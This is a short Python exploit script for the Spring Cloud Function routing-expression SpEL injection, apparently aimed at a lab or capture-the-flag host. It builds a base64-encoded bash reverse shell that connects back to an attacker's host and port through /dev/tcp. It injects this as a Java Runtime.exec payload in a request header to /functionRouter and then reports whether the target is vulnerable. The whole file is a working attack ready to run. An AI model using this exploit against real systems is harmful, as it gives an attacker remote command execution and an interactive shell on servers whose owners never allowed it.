import requests
import sys
import urllib3
import base64

url = "http://10.10.11.204:8000"
lhost = "10.10.16.24"
lport = "1234"

cmd = "bash -i >&/dev/tcp/" + lhost + "/" + lport + ' 0>&1'
cmd = cmd.encode('utf-8')
cmd = str(base64.b64encode(cmd))
cmd = cmd.strip('b')
cmd = cmd.strip("'")
cmd = 'bash -c {echo, ' + cmd + '}|{base64, -d}|{bash,-i}'

payload=f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
data = 'test'

headers = {
    'spring.cloud.function.routing-expression':payload,
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language':'en',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

path = '/functionRouter'
vulnURL = url + path

try:
    req = requests.post(url = vulnURL, headers =headers, data=data, verify=False, timeout=5)
    code = req.status_code
    text = req.text
    rsp = '"error":"Internal Server Error"'

    if code == 500 and rsp in text:
        print(f'{url} vulnerable')
        print('getting shell...')
    else :
        print(f'{url} not vulnerable')

except requests.exceptions.RequestException:
    print(f'{url} timed out')
    pass
    
except:
    print(f'{url} detection/ids error/check port')
    pass



